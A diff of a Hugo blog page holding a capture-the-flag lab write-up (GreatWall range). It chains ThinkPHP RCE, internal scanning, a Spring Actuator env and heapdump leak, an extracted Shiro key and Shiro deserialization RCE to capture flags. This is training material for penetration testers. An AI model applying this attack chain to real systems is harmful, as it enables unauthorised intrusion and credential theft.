@@ -19,7 +19,7 @@ Thinkphp5.2.3
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
   <meta name="referrer" content="no-referrer-when-downgrade">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.db3874ad7714b044ca574a35a48fc9a38e491dfc56e271a0c1a44fda4c8c0b3d.css" integrity="sha256-2zh0rXcUsETKV0o1pI/Jo45JHfxW4nGgwaRP2kyMCz0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3fcf74ad9d359e0c6c3d2b51a42f684a692fd9cd053c3829756ad5f3e4c4649b.css" integrity="sha256-P890rZ01ngxsPStRpC9oSmkv2c0FPDgpdWrV8&#43;TEZJs=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -161,32 +161,32 @@ Thinkphp5.2.3
         <ul id="menu">
             <li>
                 <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
-                    <span>首页</span>
+                    <span>首页📔</span>
                 </a>
             </li>
             <li>
                 <a href="http://localhost:1313/archives/" title="归档">
-                    <span>归档</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
-                    <span>分类</span>
+                    <span>归档🗃️</span>
                 </a>
             </li>
             <li>
                 <a href="http://localhost:1313/tags/" title="Tags">
-                    <span>标签</span>
+                    <span>标签🔖</span>
                 </a>
             </li>
             <li>
                 <a href="http://localhost:1313/search/" title="搜索">
-                    <span>搜索</span>
+                    <span>搜索🔎</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/links/" title="友链🎈">
+                    <span>友链🎈</span>
                 </a>
             </li>
             <li>
                 <a href="http://localhost:1313/about/" title="关于">
-                    <span>关于</span>
+                    <span>关于👨‍💻</span>
                 </a>
             </li>
         </ul>
@@ -257,9 +257,9 @@ Thinkphp5.2.3
 <p><a href="https://xz.aliyun.com/news/14423">春秋云境-GreatWall-先知社区</a></p></blockquote>
 <h3 id="thinkphp523">Thinkphp5.2.3<a hidden class="anchor" aria-hidden="true" href="#thinkphp523">#</a></h3>
 <p>先扫一下端口，扫出来8080端口有个后台服务</p>
-<p><img alt="image-20250516123814347" loading="lazy" src="./assets/image-20250516123814347.png"></p>
+<p><img alt="image-20250516123814347" loading="lazy" src="../assets/image-20250516123814347.png"></p>
 <p>访问8080端口</p>
-<p><img alt="image-20250516123833250" loading="lazy" src="./assets/image-20250516123833250.png"></p>
+<p><img alt="image-20250516123833250" loading="lazy" src="../assets/image-20250516123833250.png"></p>
 <p>发现这玩意根本不会发起登录请求，就是个前端壳子</p>
 <p>dirsearch扫一下，看到有个404</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">PS C:\Users\Xrntkk<span class="p">&gt;</span> dirsearch -u http://8.130.147.101:8080/
@@ -300,11 +300,11 @@ Thinkphp5.2.3
 </span></span><span class="line"><span class="ln">36</span><span class="cl">Task Completed
 </span></span></code></pre></div><p>访问404的路由即可拿到框架信息</p>
 <p>/index.php/login/</p>
-<p><img alt="image-20250516124058153" loading="lazy" src="./assets/image-20250516124058153.png"></p>
+<p><img alt="image-20250516124058153" loading="lazy" src="../assets/image-20250516124058153.png"></p>
 <p>直接上工具扫</p>
-<p><img alt="image-20250516124239086" loading="lazy" src="./assets/image-20250516124239086.png"></p>
+<p><img alt="image-20250516124239086" loading="lazy" src="../assets/image-20250516124239086.png"></p>
 <p>可以RCE</p>
-<p><img alt="image-20250516124321744" loading="lazy" src="./assets/image-20250516124321744.png"></p>
+<p><img alt="image-20250516124321744" loading="lazy" src="../assets/image-20250516124321744.png"></p>
 <p>FLAG1</p>
 <pre tabindex="0"><code>www-data@portal:/tmp$ cat /f1ag01_UdEv.txt 
 flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
@@ -375,7 +375,7 @@ flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
 </span></span><span class="line"><span class="ln">48</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7
 </span></span><span class="line"><span class="ln">49</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 匿名登录成功!
 </span></span><span class="line"><span class="ln">50</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆
-</span></span><span class="line"><span class="ln">51</span><span class="cl">[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.17:8080
+</span></span><span class="line"><span class="ln">51</span><span class="cl">[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.17:8<span class="err">0</span>80
 </span></span><span class="line"><span class="ln">52</span><span class="cl">  漏洞类型: poc-yaml-thinkphp5023-method-rce
 </span></span><span class="line"><span class="ln">53</span><span class="cl">  漏洞名称: poc1
 </span></span><span class="line"><span class="ln">54</span><span class="cl">  详细信息:
@@ -396,13 +396,13 @@ flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
 [2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.17    存活 (ICMP) //入口机
 [2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)
 </code></pre><p>其中33扫出来存在spring Actuator未授权访问和env泄露</p>
-<p><img alt="image-20250516130937261" loading="lazy" src="./assets/image-20250516130937261.png"></p>
+<p><img alt="image-20250516130937261" loading="lazy" src="../assets/image-20250516130937261.png"></p>
 <p><a href="https://cloud.tencent.com/developer/article/2070446">Springboot Actuator未授权访问漏洞复现-腾讯云开发者社区-腾讯云</a></p>
-<p><img alt="image-20250516131046898" loading="lazy" src="./assets/image-20250516131046898.png"></p>
+<p><img alt="image-20250516131046898" loading="lazy" src="../assets/image-20250516131046898.png"></p>
 <p>/actuator/env</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{</span><span class="nt">&#34;activeProfiles&#34;</span><span class="p">:[],</span><span class="nt">&#34;propertySources&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;server.ports&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;local.server.port&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="mi">8080</span><span class="p">}}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;servletContextInitParams&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;systemProperties&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;java.runtime.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;OpenJDK Runtime Environment&#34;</span><span class="p">},</span><span class="nt">&#34;java.protocol.handler.pkgs&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;org.springframework.boot.loader&#34;</span><span class="p">},</span><span class="nt">&#34;sun.boot.library.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;25.392-b08&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Private Build&#34;</span><span class="p">},</span><span class="nt">&#34;java.vendor.url&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;http://java.oracle.com/&#34;</span><span class="p">},</span><span class="nt">&#34;path.separator&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;:&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;OpenJDK 64-Bit Server VM&#34;</span><span class="p">},</span><span class="nt">&#34;file.encoding.pkg&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.io&#34;</span><span class="p">},</span><span class="nt">&#34;user.country&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;US&#34;</span><span class="p">},</span><span class="nt">&#34;sun.java.launcher&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;SUN_STANDARD&#34;</span><span class="p">},</span><span class="nt">&#34;sun.os.patch.level&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;unknown&#34;</span><span class="p">},</span><span class="nt">&#34;PID&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;663&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.specification.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Java Virtual Machine Specification&#34;</span><span class="p">},</span><span class="nt">&#34;user.dir&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/&#34;</span><span class="p">},</span><span class="nt">&#34;java.runtime.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8.0_392-8u392-ga-1~20.04-b08&#34;</span><span class="p">},</span><span class="nt">&#34;java.awt.graphicsenv&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.awt.X11GraphicsEnvironment&#34;</span><span class="p">},</span><span class="nt">&#34;java.endorsed.dirs&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed&#34;</span><span class="p">},</span><span class="nt">&#34;os.arch&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;amd64&#34;</span><span class="p">},</span><span class="nt">&#34;CONSOLE_LOG_CHARSET&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;java.io.tmpdir&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/tmp&#34;</span><span class="p">},</span><span class="nt">&#34;line.separator&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;\n&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.specification.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Oracle Corporation&#34;</span><span class="p">},</span><span class="nt">&#34;os.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Linux&#34;</span><span class="p">},</span><span class="nt">&#34;FILE_LOG_CHARSET&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;sun.jnu.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;spring.beaninfo.ignore&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">},</span><span class="nt">&#34;java.library.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Java Platform API Specification&#34;</span><span class="p">},</span><span class="nt">&#34;java.class.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;52.0&#34;</span><span class="p">},</span><span class="nt">&#34;sun.management.compiler&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;HotSpot 64-Bit Tiered Compilers&#34;</span><span class="p">},</span><span class="nt">&#34;os.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;5.4.0-169-generic&#34;</span><span class="p">},</span><span class="nt">&#34;user.home&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/home/ops01&#34;</span><span class="p">},</span><span class="nt">&#34;catalina.useNaming&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">},</span><span class="nt">&#34;user.timezone&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Asia/Shanghai&#34;</span><span class="p">},</span><span class="nt">&#34;java.awt.printerjob&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.print.PSPrinterJob&#34;</span><span class="p">},</span><span class="nt">&#34;file.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8&#34;</span><span class="p">},</span><span class="nt">&#34;catalina.home&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/tmp/tomcat.8080.6309224585124471589&#34;</span><span class="p">},</span><span class="nt">&#34;java.class.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/opt/erp/ERPApplication-0.0.1-SNAPSHOT.jar&#34;</span><span class="p">},</span><span class="nt">&#34;user.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;ops01&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.specification.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8&#34;</span><span class="p">},</span><span class="nt">&#34;sun.java.command&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;******&#34;</span><span class="p">},</span><span class="nt">&#34;java.home&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre&#34;</span><span class="p">},</span><span class="nt">&#34;sun.arch.data.model&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;64&#34;</span><span class="p">},</span><span class="nt">&#34;user.language&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;en&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Oracle Corporation&#34;</span><span class="p">},</span><span class="nt">&#34;awt.toolkit&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.awt.X11.XToolkit&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.info&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;mixed mode&#34;</span><span class="p">},</span><span class="nt">&#34;java.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8.0_392&#34;</span><span class="p">},</span><span class="nt">&#34;java.ext.dirs&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext&#34;</span><span class="p">},</span><span class="nt">&#34;sun.boot.class.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes&#34;</span><span class="p">},</span><span class="nt">&#34;java.awt.headless&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">},</span><span class="nt">&#34;java.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Private Build&#34;</span><span class="p">},</span><span class="nt">&#34;catalina.base&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/tmp/tomcat.8080.6309224585124471589&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.maintenance.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;5&#34;</span><span class="p">},</span><span class="nt">&#34;file.separator&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/&#34;</span><span class="p">},</span><span class="nt">&#34;java.vendor.url.bug&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;http://bugreport.sun.com/bugreport/&#34;</span><span class="p">},</span><span class="nt">&#34;sun.io.unicode.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UnicodeLittle&#34;</span><span class="p">},</span><span class="nt">&#34;sun.cpu.endian&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;little&#34;</span><span class="p">},</span><span class="nt">&#34;sun.cpu.isalist&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">}}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;systemEnvironment&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;PATH&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;PATH\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;INVOCATION_ID&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;18b641dc6657423cbdeab6262fd1ee07&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;INVOCATION_ID\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;JOURNAL_STREAM&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;9:19204&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;JOURNAL_STREAM\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;LOGNAME&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;ops01&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;LOGNAME\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;USER&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;ops01&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;USER\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;PWD&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;PWD\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;LANG&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;en_US.UTF-8&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;LANG\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;SHLVL&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;SHLVL\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;HOME&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/home/ops01&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;HOME\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;_&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/bin/java&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;_\&#34;&#34;</span><span class="p">}}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Config resource &#39;class path resource [application.properties]&#39; via location &#39;optional:classpath:/&#39;&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;server.port&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;8080&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 1:13&#34;</span><span class="p">},</span><span class="nt">&#34;management.endpoints.jmx.exposure.include&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;*&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 3:43&#34;</span><span class="p">},</span><span class="nt">&#34;management.endpoints.web.exposure.include&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;*&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 4:43&#34;</span><span class="p">},</span><span class="nt">&#34;management.endpoint.health.show-details&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;always&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 5:41&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.cache&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 8:24&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.check-template&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 9:33&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.check-template-location&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 10:42&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.content-type&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;text/html&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 11:31&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.enabled&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 12:26&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 13:27&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.excluded-view-names&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:0&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.mode&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;HTML5&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:23&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.prefix&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;classpath:/templates/&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 16:25&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.suffix&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 17:25&#34;</span><span class="p">}}}]}</span>
 </span></span></code></pre></div><p>用<a href="https://github.com/whwlsfb/JDumpSpider">whwlsfb/JDumpSpider: HeapDump敏感信息提取工具</a>自动提取heapdump敏感信息</p>
-<p><img alt="image-20250516133111669" loading="lazy" src="./assets/image-20250516133111669.png"></p>
+<p><img alt="image-20250516133111669" loading="lazy" src="../assets/image-20250516133111669.png"></p>
 <p>可以拿到shiro key</p>
 <pre tabindex="0"><code>===========================================
 CookieRememberMeManager(ShiroKey)
@@ -410,7 +410,7 @@ CookieRememberMeManager(ShiroKey)
 algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES
 
 ===========================================
-</code></pre><p><img alt="image-20250516133356045" loading="lazy" src="./assets/image-20250516133356045.png"></p>
+</code></pre><p><img alt="image-20250516133356045" loading="lazy" src="../assets/image-20250516133356045.png"></p>
 <p>shiro反序列化打CB链，成功RCE</p>
 <p>没有找到flag，说明要提权</p>
 <p>/home/ops01里面有一个HashNote，且监听了59696端口，说明要打pwn来提权</p>
@@ -422,7 +422,7 @@ flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
